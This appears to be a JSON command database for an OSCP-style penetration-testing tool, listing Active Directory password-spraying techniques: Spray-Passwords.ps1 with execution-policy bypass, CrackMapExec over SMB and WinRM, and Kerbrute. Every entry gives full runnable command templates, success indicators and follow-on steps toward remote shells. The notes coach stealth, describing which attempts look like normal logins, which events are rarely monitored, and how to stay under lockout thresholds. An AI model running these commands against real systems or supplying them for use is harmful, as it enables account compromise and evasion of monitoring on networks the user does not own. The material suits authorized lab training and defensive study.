{
  "commands": [
    {
      "id": "spray-passwords-ldap",
      "name": "Spray-Passwords.ps1 - LDAP Password Spraying",
      "description": "PowerShell script for low-and-slow Active Directory password spraying via LDAP/DirectoryEntry (policy-aware)",
      "command": "powershell -ep bypass -c \"C:\\Tools\\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin\"",
      "category": "password-attacks",
      "subcategory": "active-directory",
      "variables": [
        {
          "name": "<PASSWORD>",
          "description": "Single password to spray against all domain users",
          "example": "Nexus123!",
          "required": true
        }
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "PASSWORD_SPRAY",
        "WINDOWS",
        "POWERSHELL",
        "LDAP",
        "OSCP:HIGH"
      ],
      "flag_explanations": {
        "-Pass": "Single password to test against all domain users",
        "-File": "Password wordlist file (alternative to -Pass for multiple passwords)",
        "-Admin": "Include administrator accounts in spray (default is standard users only)",
        "-ep bypass": "PowerShell execution policy bypass"
      },
      "success_indicators": [
        "Guessed password for user:",
        "Users guessed are:",
        "with password:"
      ],
      "failure_indicators": [
        "The user name or password is incorrect",
        "Account locked out",
        "Access denied"
      ],
      "next_steps": [
        "crackmapexec-validate-admin",
        "evil-winrm",
        "psexec",
        "rdp-connect"
      ],
      "alternatives": [
        "crackmapexec-smb-spray",
        "kerbrute-passwordspray",
        "crackmapexec-winrm-spray"
      ],
      "prerequisites": [
        "net-accounts-policy"
      ],
      "troubleshooting": {
        "Access denied": "Script requires domain user context. Run from domain-joined Windows system or use RDP/WinRM with valid credentials first.",
        "Account locked out": "Exceeded lockout threshold. Check password policy with net-accounts-policy and wait for lockout observation window to expire.",
        "Execution policy error": "Use -ep bypass flag: powershell -ep bypass -c \"C:\\Tools\\Spray-Passwords.ps1 -Pass <PASSWORD>\""
      },
      "notes": "LOW-AND-SLOW password spraying method using PowerShell DirectoryEntry LDAP authentication. AUTOMATICALLY reads domain password policy and respects lockout threshold. NOISE LEVEL: Very Low - only generates standard authentication events (Event ID 4776), appears as normal login attempts. SPEED: Slow (1-2 attempts per second) but STEALTHY. WHY THIS WORKS: DirectoryEntry constructor accepts three arguments (LDAP path, username, password). If credentials are valid, object creation succeeds. If invalid, exception is thrown. Script enumerates all domain users via LDAP and attempts authentication for each user with the supplied password. ADVANTAGES: Policy-aware (won't lock out accounts), generates minimal network traffic, looks like normal user logins. TIME ESTIMATE: 2-5 minutes for 100 users. MANUAL ALTERNATIVE: PowerShell one-liner: $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $PDC = ($domainObj.PdcRoleOwner).Name; $dn = 'DC=' + ($domainObj.Name -replace '\\.',',DC='); $ldap = \"LDAP://$PDC/$dn\"; New-Object System.DirectoryServices.DirectoryEntry($ldap, 'username', 'password'). If successful, returns distinguishedName and Path properties. OSCP TIP: Use this method when you have access to a domain-joined Windows system. Run from PowerShell as logged-in domain user. Script is at C:\\Tools\\Spray-Passwords.ps1 on many lab systems. Source: https://github.com/ZilentJack/Spray-Passwords",
      "oscp_relevance": "high"
    },
    {
      "id": "crackmapexec-smb-spray",
      "name": "CrackMapExec - SMB Password Spraying",
      "description": "SMB-based password spraying with CrackMapExec (noisy but shows admin rights with Pwn3d! indicator)",
      "command": "crackmapexec smb <TARGET> -u <USERLIST> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success",
      "category": "password-attacks",
      "subcategory": "active-directory",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname (any domain-joined system)",
          "example": "192.168.50.75",
          "required": true
        },
        {
          "name": "<USERLIST>",
          "description": "File containing usernames (one per line) or single username",
          "example": "users.txt",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "Password to spray (use single quotes to preserve special characters)",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Active Directory domain name",
          "example": "corp.com",
          "required": true
        }
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "PASSWORD_SPRAY",
        "SMB",
        "LINUX",
        "CRACKMAPEXEC",
        "OSCP:HIGH"
      ],
      "flag_explanations": {
        "smb": "Use SMB protocol for authentication",
        "-u": "Username or file containing usernames (automatically detects file vs single username)",
        "-p": "Password (use quotes for special characters)",
        "-d": "Domain name for domain authentication",
        "--continue-on-success": "Don't stop at first valid credential, test all users",
        "--local-auth": "Authenticate to local SAM instead of domain (not for domain spraying)",
        "-t": "Number of threads (default 100, reduce if causing network issues)"
      },
      "success_indicators": [
        "[+]",
        "(Pwn3d!)",
        "valid credentials"
      ],
      "failure_indicators": [
        "[-]",
        "STATUS_LOGON_FAILURE",
        "STATUS_ACCOUNT_LOCKED_OUT",
        "Connection refused"
      ],
      "next_steps": [
        "crackmapexec-validate-admin",
        "psexec",
        "smbexec",
        "wmiexec",
        "evil-winrm"
      ],
      "alternatives": [
        "spray-passwords-ldap",
        "kerbrute-passwordspray",
        "crackmapexec-winrm-spray"
      ],
      "prerequisites": [
        "crackmapexec-policy",
        "kerbrute-userenum-ad"
      ],
      "troubleshooting": {
        "STATUS_ACCOUNT_LOCKED_OUT": "Exceeded lockout threshold. Wait for lockout duration to expire (check policy with crackmapexec-policy). Reduce spray frequency.",
        "STATUS_LOGON_FAILURE": "Invalid credentials (expected for wrong password). [+] indicates valid credentials.",
        "Connection refused": "SMB port 445 blocked. Verify connectivity: sudo nmap -p 445 -Pn -v <TARGET>",
        "Too many failed attempts": "CAUTION: CrackMapExec does NOT check password policy. Manually calculate safe attempts: (lockout threshold - 1) attempts per (lockout observation window)."
      },
      "notes": "TRADITIONAL password spraying via SMB. NOISY but provides BONUS FEATURE: Pwn3d! indicator shows when credentials have LOCAL ADMIN rights on target system. NOISE LEVEL: High - each attempt creates full SMB connection, generates Event ID 4625 (failed logon) for wrong passwords, Event ID 4624 (successful logon) for valid credentials. NETWORK TRAFFIC: High - full SMB session setup/teardown for each attempt. SPEED: Slow (1 attempt per second). WHY THIS WORKS: CrackMapExec establishes SMB connection and attempts NTLM authentication. Success/failure determined by STATUS code. Local admin rights detected by attempting to list shares or access IPC$. CRITICAL WARNING: CrackMapExec does NOT respect password policy or check lockout threshold. YOU must manually ensure you don't exceed lockout threshold (use 4 attempts max if threshold is 5, then wait for observation window). TIME ESTIMATE: 1-3 minutes for 20 users. RECOMMENDED USAGE: Use after getting password policy (crackmapexec-policy) and calculating safe spray count. Example calculation: 5 lockout threshold, 30min observation window = spray 4 passwords max, wait 30min, repeat. OSCP TIP: Despite being noisy, this is valuable for identifying admin rights immediately. Use for final validation after finding credentials with quieter methods. Create users.txt with one username per line first.",
      "oscp_relevance": "high"
    },
    {
      "id": "kerbrute-passwordspray",
      "name": "Kerbrute - Kerberos Password Spraying",
      "description": "Ultra-fast and stealthy password spraying via Kerberos pre-authentication (only 2 UDP packets per attempt)",
      "command": "kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERLIST> '<PASSWORD>'",
      "category": "password-attacks",
      "subcategory": "active-directory",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Active Directory domain name (FQDN)",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<DC_IP>",
          "description": "Domain controller IP address",
          "example": "192.168.50.70",
          "required": true
        },
        {
          "name": "<USERLIST>",
          "description": "File containing valid usernames (one per line)",
          "example": "valid_users.txt",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "Password to spray (use quotes for special characters)",
          "example": "Nexus123!",
          "required": true
        }
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "PASSWORD_SPRAY",
        "KERBEROS",
        "LINUX",
        "WINDOWS",
        "OSCP:HIGH",
        "QUICK_WIN"
      ],
      "flag_explanations": {
        "passwordspray": "Password spraying mode",
        "-d": "Domain name (FQDN)",
        "--dc": "Domain controller IP address",
        "-o": "Output file for valid credentials",
        "-t": "Number of threads (default 10)",
        "--safe": "Low-and-slow mode with delays"
      },
      "success_indicators": [
        "[+] VALID LOGIN:",
        "Done! Tested",
        "successes"
      ],
      "failure_indicators": [
        "Network error",
        "Couldn't find any KDCs",
        "context deadline exceeded"
      ],
      "next_steps": [
        "kerbrute-validate-creds",
        "crackmapexec-validate-admin",
        "evil-winrm",
        "impacket-getTGT"
      ],
      "alternatives": [
        "spray-passwords-ldap",
        "crackmapexec-smb-spray",
        "crackmapexec-winrm-spray"
      ],
      "prerequisites": [
        "kerbrute-userenum-ad",
        "net-accounts-policy"
      ],
      "troubleshooting": {
        "Couldn't find any KDCs": "DC IP incorrect or Kerberos port 88 filtered. Verify: sudo nmap -p 88 -Pn -sU -v <DC_IP>",
        "context deadline exceeded": "Network timeout. Use --safe flag for slower requests or check connectivity",
        "No valid logins found": "Password incorrect for all users (expected). Try different password or verify usernames are valid."
      },
      "notes": "FASTEST and STEALTHIEST password spraying method. Uses Kerberos AS-REQ (TGT request) to test credentials. ONLY 2 UDP PACKETS per attempt (AS-REQ and AS-REP). NOISE LEVEL: Minimal - only generates Event ID 4768 (TGT request) for valid credentials, Event ID 4771 (pre-auth failure) for wrong passwords. These events are NORMAL domain traffic and rarely monitored. SPEED: Extremely fast - hundreds of attempts per second possible. NETWORK TRAFFIC: Minimal - 2 small UDP packets (typically <500 bytes total). WHY THIS WORKS: Kerberos pre-authentication requires encrypted timestamp using user's password hash. If password is correct, KDC responds with TGT. If wrong, KDC responds with PREAUTH_FAILED. This is by-design Kerberos behavior. ADVANTAGES: No SMB connection needed, works remotely without network access to domain resources (only need UDP 88 to DC), no full authentication = stealthier. TIME ESTIMATE: 10-30 seconds for 100 users. CRITICAL: Does NOT check password policy. You must calculate safe attempts manually. Example: 5 lockout threshold = spray 4 passwords max per user, wait 30min (observation window), repeat. OSCP TIP: Preferred method for password spraying when you can reach DC on UDP 88. Use kerbrute userenum first to build valid username list, then spray. Save results: kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERLIST> '<PASSWORD>' -o valid_creds.txt. Can be run from Windows or Linux.",
      "oscp_relevance": "high"
    },
    {
      "id": "crackmapexec-winrm-spray",
      "name": "CrackMapExec - WinRM Password Spraying",
      "description": "WinRM-based password spraying to identify credentials with remote PowerShell access",
      "command": "crackmapexec winrm <TARGET> -u <USERLIST> -p '<PASSWORD>' -d <DOMAIN>",
      "category": "password-attacks",
      "subcategory": "active-directory",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname (system with WinRM enabled)",
          "example": "192.168.50.75",
          "required": true
        },
        {
          "name": "<USERLIST>",
          "description": "File containing usernames or single username",
          "example": "users.txt",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "Password to test (use quotes for special characters)",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Active Directory domain name",
          "example": "corp.com",
          "required": true
        }
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "PASSWORD_SPRAY",
        "WINRM",
        "LINUX",
        "OSCP:HIGH"
      ],
      "flag_explanations": {
        "winrm": "Use WinRM protocol (HTTP/HTTPS remote management)",
        "-u": "Username or file containing usernames",
        "-p": "Password to test",
        "-d": "Domain name",
        "--continue-on-success": "Test all users, don't stop at first valid credential"
      },
      "success_indicators": [
        "[+]",
        "(Pwn3d!)",
        "valid credentials"
      ],
      "failure_indicators": [
        "[-]",
        "Connection refused",
        "Authentication failed"
      ],
      "next_steps": [
        "evil-winrm",
        "winrs",
        "enter-pssession"
      ],
      "alternatives": [
        "crackmapexec-smb-spray",
        "spray-passwords-ldap",
        "kerbrute-passwordspray"
      ],
      "prerequisites": [
        "crackmapexec-policy",
        "kerbrute-userenum-ad"
      ],
      "troubleshooting": {
        "Connection refused": "WinRM not enabled or port 5985/5986 blocked. Verify: sudo nmap -p 5985,5986 -Pn -v <TARGET>",
        "Authentication failed": "Expected for wrong password. [+] indicates valid credentials.",
        "Pwn3d! not showing": "Valid credentials found but user not in Remote Management Users group. Credentials still valid for other services."
      },
      "notes": "SPECIALIZED password spraying for WinRM access. Tests if credentials have remote PowerShell access (user in Remote Management Users group or local admin). NOISE LEVEL: Medium-High - WinRM authentication attempts logged (Event ID 4625 for failures, 4624 for success). PORT REQUIREMENTS: TCP 5985 (HTTP) or 5986 (HTTPS). WHY THIS WORKS: CrackMapExec establishes WinRM connection and attempts authentication. Pwn3d! indicator shows when user has remote management rights. ADVANTAGES: Directly identifies credentials that can be used with evil-winrm or Enter-PSSession for remote PowerShell access. SPEED: Medium (2-3 seconds per attempt). TIME ESTIMATE: 2-4 minutes for 20 users. USE CASE: When you specifically want remote PowerShell access rather than SMB. WinRM is increasingly common on modern Windows environments (default enabled on servers). OSCP TIP: WinRM is often enabled on Windows Server targets. If you find valid credentials via this method, immediately try evil-winrm for interactive PowerShell shell: evil-winrm -i <TARGET> -u <USER> -p '<PASSWORD>'. Does NOT check password policy - calculate safe attempts manually.",
      "oscp_relevance": "high"
    }
  ]
}
